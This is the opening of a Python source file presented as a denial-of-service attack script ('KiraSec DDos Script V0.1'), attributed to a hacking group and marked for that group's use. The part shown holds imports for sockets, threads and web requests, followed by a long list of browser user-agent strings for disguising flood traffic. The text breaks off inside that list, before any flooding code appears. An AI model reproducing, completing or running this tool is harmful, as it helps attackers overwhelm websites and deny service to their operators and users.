#!/usr/bin/python3
# -*- coding: utf-8 -*-

# python 3.3.2+ KiraSec DDos Script V0.1
# by AnonZenn ~ KiraSec
# only for KiraSec

from colorama import Fore, Back, Style
from queue import Queue
from optparse import OptionParser
import time, sys, socket, threading, logging, urllib.request, random


def user_agent():
    global uagent
    uagent = []
    uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
    uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
    uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
    uagent.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
    uagent.append(
        "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
    uagent.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
    uagent.append(
        "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 FirePHP/0.3")
    uagent.append("Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; es-AR; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1")
    uagent.append("Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; es-ES; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1")
    uagent.append("Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; ru; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.0; ja; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 GTB5")
    uagent.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 (.NET CLR 3.5.30729) FirePHP/0.3")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 FirePHP/0.3")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1")
    uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; rv:1.9.1.1) Gecko/20090716 Linux Firefox/3.5.1")
    uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.3) Gecko/20100524 Firefox/3.5.1")
    uagent.append(
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090716 Linux Mint/7 (Gloria) Firefox/3.5.1")
    uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090716 Firefox/3.5.1")
    uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090714 SUSE/3.5.1-1.1 Firefox/3.5.1")
    uagent.append("Mozilla/5.0 (X11; U; Linux x86; rv:1.9.1.1) Gecko/20090716 Linux Firefox/3.5.1")
    uagent.append("Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1")
    uagent.append("Mozilla/5.0 (X11; U; Linux i686; nl-NL; rv:1.9.0.19) Gecko/20090720 Firefox/3.5.1")
    uagent.append(
        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.2pre) Gecko/20090729 Ubuntu/9.04 (jaunty) Firefox/3.5.1")
    uagent.append("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 GTB5")
    uagent.append("Mozilla/5.0 (X11; U; Linux i686; de; rv:1.9.1.1) Gecko/20090722 Gentoo Firefox/3.5.1")
    uagent.append("Mozilla/5.0 (X11; U; Linux i686; de; rv:1.9.1.1) Gecko/20090714 SUSE/3.5.1-1.1 Firefox/3.5.1")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; de; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1")
    uagent.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.0; tr; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 (.NET CLR 3.5.30729)")
    uagent.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.0; sv-SE; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 (.NET CLR 3.5.30729)")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.0; ja; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1")
    uagent.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 GTB5 (.NET CLR 4.0.20506)")
    uagent.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 GTB5 (.NET CLR 3.5.30729)")
    uagent.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 GTB5 (.NET CLR 3.5.30729)")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.0; ca; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1")
    uagent.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.2; zh-CN; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 (.NET CLR 3.5.30729)")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; tr; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; hu; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.1; uk; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.1; sv-SE; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1")
    uagent.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; sr; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 (.NET CLR 3.5.30729)")
    uagent.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 (.NET CLR 3.5.30729) FirePHP/0.3")
    uagent.append(
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36")
    uagent.append(
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36")
    uagent.append(
        "Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2820.59 Safari/537.36")
    uagent.append(
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36")
    uagent.append(
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36")
    uagent.append(
        "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36")
    uagent.append(
        "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36")
    uagent.append(
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36")
    uagent.append(
        "Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36")
    uagent.append(
        "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36")
    uagent.append(
        "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36")
    uagent.append(
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36")
    uagent.append(
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36")
    uagent.append(
        "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36")
    uagent.append(
        "Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36")
    uagent.append(
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36")
    uagent.append(
        "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.16 Safari/537.36")
    uagent.append(
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1623.0 Safari/537.36")
    uagent.append(
        "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.17 Safari/537.36")
    uagent.append(
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.62 Safari/537.36")
    uagent.append(
        "Mozilla/5.0 (X11; CrOS i686 4319.74.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.57 Safari/537.36")
    uagent.append(
        "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.2 Safari/537.36")
    uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.94 Safari/537.4")
    uagent.append(
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_0) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.79 Safari/537.4")
    uagent.append("Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.2 (KHTML, like Gecko) Chrome/22.0.1216.0 Safari/537.2")
    uagent.append(
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1")
    uagent.append(
        "Mozilla/5.0 (X11; CrOS i686 2268.111.0) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11")
    uagent.append(
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6")
    uagent.append(
        "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/19.77.34.5 Safari/537.1")
    uagent.append(
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5")
    uagent.append(
        "Mozilla/5.0 (X11; FreeBSD amd64) AppleWebKit/536.5 (KHTML like Gecko) Chrome/19.0.1084.56 Safari/1EA69")
    uagent.append("Mozilla/5.0 (Windows NT 6.0) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.36 Safari/536.5")
    uagent.append(
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24")
    uagent.append(
        "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24")
    uagent.append(
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_2) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24")
    uagent.append(
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.22 (KHTML, like Gecko) Chrome/19.0.1047.0 Safari/535.22")
    uagent.append(
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.21 (KHTML, like Gecko) Chrome/19.0.1042.0 Safari/535.21")
    uagent.append(
        "Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.21 (KHTML, like Gecko) Chrome/19.0.1041.0 Safari/535.21")
    uagent.append(
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20")
    uagent.append(
        "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0")
    uagent.append("Mozilla/5.0 (Macintosh; AMD Mac OS X 10_8_2) AppleWebKit/535.22 (KHTML, like Gecko) Chrome/18.6.872")
    uagent.append(
        "Mozilla/5.0 (X11; CrOS i686 1660.57.0) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.46 Safari/535.19")
    uagent.append(
        "Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.45 Safari/535.19")
    uagent.append(
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_2) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.45 Safari/535.19")
    uagent.append(
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.45 Safari/535.19")
    uagent.append(
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Safari/535.19")
    uagent.append(
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_8) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.151 Safari/535.19")
    uagent.append(
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.19 (KHTML, like Gecko) Ubuntu/11.10 Chromium/18.0.1025.142 Chrome/18.0.1025.142 Safari/535.19")
    uagent.append(
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.11 Safari/535.19")
    uagent.append(
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11")
    uagent.append(
        "Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11")
    uagent.append(
        "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11")
    uagent.append(
        "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11")
    uagent.append(
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11")
    uagent.append(
        "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11")
    uagent.append(
        "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11")
    uagent.append(
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11")
    uagent.append(
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_2) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11")
    uagent.append(
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11")
    uagent.append(
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_8) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11")
    uagent.append(
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Ubuntu/11.10 Chromium/17.0.963.65 Chrome/17.0.963.65 Safari/535.11")
    uagent.append(
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Ubuntu/11.04 Chromium/17.0.963.65 Chrome/17.0.963.65 Safari/535.11")
    uagent.append(
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Ubuntu/10.10 Chromium/17.0.963.65 Chrome/17.0.963.65 Safari/535.11")
    uagent.append(
        "Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.11 (KHTML, like Gecko) Ubuntu/11.10 Chromium/17.0.963.65 Chrome/17.0.963.65 Safari/535.11")
    uagent.append(
        "Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.65 Safari/535.11")
    uagent.append(
        "Mozilla/5.0 (X11; FreeBSD amd64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.65 Safari/535.11")
    uagent.append(
        "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.65 Safari/535.11")
    uagent.append(
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_2) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.65 Safari/535.11")
    uagent.append(
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.65 Safari/535.11")
    uagent.append(
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_4) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.65 Safari/535.11")
    uagent.append(
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Ubuntu/11.04 Chromium/17.0.963.56 Chrome/17.0.963.56 Safari/535.11")
    uagent.append(
        "Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11")
    uagent.append(
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11")
    uagent.append(
        "Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11")
    uagent.append(
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.12 Safari/535.11")
    uagent.append(
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.8 (KHTML, like Gecko) Chrome/17.0.940.0 Safari/535.8")
    uagent.append(
        "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.77 Safari/535.7ad-imcjapan-syosyaman-xkgi3lqg03!wgz")
    uagent.append(
        "Mozilla/5.0 (X11; CrOS i686 1193.158.0) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.75 Safari/535.7")
    uagent.append(
        "Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.75 Safari/535.7")
    uagent.append("Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.75 Safari/535.7")
    uagent.append(
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.63 Safari/535.7xs5D9rRDFpg2g")
    uagent.append("Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.8 (KHTML, like Gecko) Chrome/16.0.912.63 Safari/535.8")
    uagent.append(
        "Mozilla/5.0 (Windows NT 5.2; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.63 Safari/535.7")
    uagent.append(
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7")
    uagent.append(
        "Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7")
    uagent.append(
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7")
    uagent.append("Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.6 (KHTML, like Gecko) Chrome/16.0.897.0 Safari/535.6")
    uagent.append(
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.54 Safari/535.2")
    uagent.append(
        "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.121 Safari/535.2")
    uagent.append(
        "Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/11.10 Chromium/15.0.874.120 Chrome/15.0.874.120 Safari/535.2")
    uagent.append("Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2")
    uagent.append("Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.872.0 Safari/535.2")
    uagent.append(
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/11.04 Chromium/15.0.871.0 Chrome/15.0.871.0 Safari/535.2")
    uagent.append("Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.864.0 Safari/535.2")
    uagent.append("Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.861.0 Safari/535.2")
    uagent.append(
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.861.0 Safari/535.2")
    uagent.append("Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.860.0 Safari/535.2")
    uagent.append(
        "Chrome/15.0.860.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/15.0.860.0")
    uagent.append(
        "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_3; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.366.0 Safari/533.4")
    uagent.append(
        "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_2; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.366.0 Safari/533.4")
    uagent.append(
        "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_3; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.363.0 Safari/533.3")
    uagent.append(
        "Mozilla/5.0 (X11; U; OpenBSD i386; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.359.0 Safari/533.3")
    uagent.append(
        "Mozilla/5.0 (X11; U; x86_64 Linux; en_GB, en_US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.358.0 Safari/533.3")
    uagent.append(
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.358.0 Safari/533.3")
    uagent.append(
        "Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.358.0 Safari/533.3")
    uagent.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.357.0 Safari/533.3")
    uagent.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.356.0 Safari/533.3")
    uagent.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.355.0 Safari/533.3")
    uagent.append(
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.354.0 Safari/533.3")
    uagent.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.354.0 Safari/533.3")
    uagent.append(
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.353.0 Safari/533.3")
    uagent.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.353.0 Safari/533.3")
    uagent.append(
        "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_2; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.343.0 Safari/533.2")
    uagent.append(
        "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.343.0 Safari/533.2")
    uagent.append(
        "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_7_0; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.342.7 Safari/533.2")
    uagent.append(
        "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_4; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.342.7 Safari/533.2")
    uagent.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.342.5 Safari/533.2")
    uagent.append(
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.342.3 Safari/533.2")
    uagent.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.342.3 Safari/533.2")
    uagent.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.342.2 Safari/533.2")
    uagent.append(
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.342.1 Safari/533.2")
    uagent.append(
        "Mozilla/5.0 (X11; U; Linux i586; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.342.1 Safari/533.2")
    uagent.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.342.1 Safari/533.2")
    uagent.append(
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Chrome/5.0.335.0 Safari/533.1")
    uagent.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/533.16 (KHTML, like Gecko) Chrome/5.0.335.0 Safari/533.16")
    uagent.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.310.0 Safari/532.9")
    uagent.append(
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9")
    uagent.append(
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.308.0 Safari/532.9")
    uagent.append(
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36")
    uagent.append(
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36")
    uagent.append("Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")
    uagent.append("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0")
    uagent.append(
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9")
    uagent.append(
        "Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4")
    uagent.append(
        "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36")
    uagent.append(
